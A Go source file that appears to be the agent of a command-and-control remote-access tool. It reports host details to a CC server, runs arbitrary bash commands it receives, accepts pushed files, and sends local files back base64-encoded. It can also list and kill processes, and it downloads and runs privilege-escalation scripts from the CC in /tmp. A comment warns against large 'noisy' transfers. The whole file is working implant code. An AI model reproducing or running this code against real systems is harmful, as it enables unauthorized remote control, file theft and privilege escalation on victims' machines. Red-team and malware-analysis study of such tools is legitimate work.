package agent

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	gops "github.com/mitchellh/go-ps"
	"github.com/zcalusic/sysinfo"
)

// Send2CC send TunData to CC
func Send2CC(data *TunData) error {
	var out = json.NewEncoder(CCConn)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// RandInt random int between given interval
func RandInt(min, max int) int {
	seed := rand.NewSource(time.Now().UTC().Unix())
	return min + rand.New(seed).Intn(max-min)
}

// Download download via HTTP
func Download(url, path string) (err error) {
	var (
		resp *http.Response
		data []byte
	)
	resp, err = HTTPClient.Get(url)
	if err != nil {
		return
	}

	data, err = ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return
	}

	return ioutil.WriteFile(path, data, 0600)
}

func collectSystemInfo() *SystemInfo {
	var (
		si   sysinfo.SysInfo
		info SystemInfo
	)
	si.GetSysInfo() // read sysinfo

	info.Tag = Tag

	info.OS = fmt.Sprintf("%s %s", si.OS.Name, si.OS.Version)
	info.Kernel = si.Kernel.Release
	info.Arch = si.Kernel.Architecture
	info.CPU = fmt.Sprintf("%s (x%d)", si.CPU.Model, getCPUCnt())
	info.Mem = fmt.Sprintf("%d kB", getMemSize())

	// have root?
	info.HasRoot = os.Geteuid() == 0

	// IP address?
	info.IPs = collectLocalIPs()

	return &info
}

func getMemSize() (size int) {
	var err error
	f, err := os.Open("/proc/meminfo")
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lineSplit := strings.Fields(scanner.Text())

		if lineSplit[0] == "MemTotal:" {
			size, err = strconv.Atoi(lineSplit[1])
			if err != nil {
				size = 0
			}
		}
	}

	return
}
func getCPUCnt() (cpuCnt int) {
	f, err := os.Open("/proc/cpuinfo")
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		if strings.HasPrefix(line, "processor") {
			cpuCnt++
		}
	}

	return
}

func collectLocalIPs() (ips []string) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}

	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ipaddr := ip.String()
			if ipaddr == "::1" ||
				ipaddr == "127.0.0.1" ||
				strings.HasPrefix(ipaddr, "fe80:") {
				continue
			}

			ips = append(ips, ipaddr)
		}
	}

	return
}

// exec cmd, receive data, etc
func processCCData(data *TunData) {
	var (
		data2send   TunData
		out         string
		outCombined []byte
		err         error
	)
	data2send.Tag = Tag

	payloadSplit := strings.Split(data.Payload, OpSep)
	op := payloadSplit[0]

	switch op {

	// command from CC
	case "cmd":
		cmdSlice := strings.Fields(payloadSplit[1])

		// # shell helpers
		if strings.HasPrefix(cmdSlice[0], "#") {
			out = shellHelper(cmdSlice)
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// change directory
		if cmdSlice[0] == "cd" {
			if len(cmdSlice) != 2 {
				return
			}

			if os.Chdir(cmdSlice[1]) == nil {
				out = "changed directory to " + cmdSlice[1]
				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
				goto send
			}
		}

		// current working directory
		if cmdSlice[0] == "pwd" {
			if len(cmdSlice) != 1 {
				return
			}

			pwd, err := os.Getwd()
			if err != nil {
				log.Println("processCCData: cant get pwd: ", err)
				pwd = err.Error()
			}

			out = "current working directory: " + pwd
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// LPE helper
		if strings.HasPrefix(cmdSlice[0], "lpe_") {
			out = lpeHelper(cmdSlice[0])
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// exec cmd using os/exec normally, sends stdout and stderr back to CC
		cmd := exec.Command("bash", "-c", strings.Join(cmdSlice, " "))
		outCombined, err = cmd.CombinedOutput()
		if err != nil {
			log.Println(err)
			outCombined = []byte(fmt.Sprintf("%s\n%v", outCombined, err))
		}

		out = string(outCombined)
		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)

	// #put file from CC
	case "FILE":
		if len(payloadSplit) != 3 {
			data2send.Payload = fmt.Sprintf("#put failed: malformed #put command")
			goto send
		}

		// where to save the file
		path := payloadSplit[1]
		data := payloadSplit[2]

		// decode
		decData, err := base64.StdEncoding.DecodeString(data)
		if err != nil {
			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
			goto send
		}

		// write file
		err = ioutil.WriteFile(path, decData, 0600)
		if err != nil {
			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
			goto send
		}
		log.Printf("Saved %s from CC", path)
		data2send.Payload = fmt.Sprintf("#put %s successfully done", path)

	default:
	}

send:
	if err = Send2CC(&data2send); err != nil {
		log.Println(err)
	}
}

// shellHelper ps and kill and other helpers
func shellHelper(cmdSlice []string) (out string) {
	cmd := cmdSlice[0]
	args := cmdSlice[1:]

	switch cmd {
	case "#ps":
		procs, err := gops.Processes()
		if err != nil {
			out = fmt.Sprintf("failed to ps: %v", err)
		}

		for _, proc := range procs {
			out = fmt.Sprintf("%s\n%d<-%d    %s", out, proc.Pid(), proc.PPid(), proc.Executable())
		}
	case "#kill":
		for _, pidStr := range args {
			pid, err := strconv.Atoi(pidStr)
			if err != nil {
				continue
			}
			proc, err := os.FindProcess(pid)
			if err != nil {
				continue
			}

			// kill process
			err = proc.Kill()
			if err != nil {
				out = fmt.Sprintf("%s\nfailed to kill %d: %v", out, pid, err)
				continue
			}
			out = fmt.Sprintf("%s\nsuccessfully killed %d", out, pid)
		}
	case "#get":
		filepath := args[0]
		checksum, err := file2CC(filepath)
		out = fmt.Sprintf("%s (%s) has been sent, please check", filepath, checksum)
		if err != nil {
			out = filepath + err.Error()
		}
	default:
		out = "Unknown helper"
	}

	return
}

// lpeHelper runs les and upc to suggest LPE methods
func lpeHelper(method string) string {
	err := Download(CCAddress+method, "/tmp/"+method)
	if err != nil {
		return "LPE error: " + err.Error()
	}
	lpe := fmt.Sprintf("/tmp/%s", method)

	cmd := exec.Command("/bin/bash", lpe)
	if method == "lpe_upc" {
		cmd = exec.Command("/bin/bash", lpe, "standard")
	}

	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		return "LPE error: " + string(outBytes)
	}

	return string(outBytes)
}

// send local file to CC
func file2CC(filepath string) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		return
	}
	// file sha256sum
	sum := sha256.Sum256(bytes)
	checksum = fmt.Sprintf("%x", sum)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	if sizemB > 20 {
		return checksum, errors.New("please do NOT transfer large files this way as it's too NOISY, aborting")
	}

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := TunData{
		Payload: "FILE" + OpSep + filepath + OpSep + payload,
		Tag:     Tag,
	}

	// send
	return checksum, Send2CC(&fileData)
}
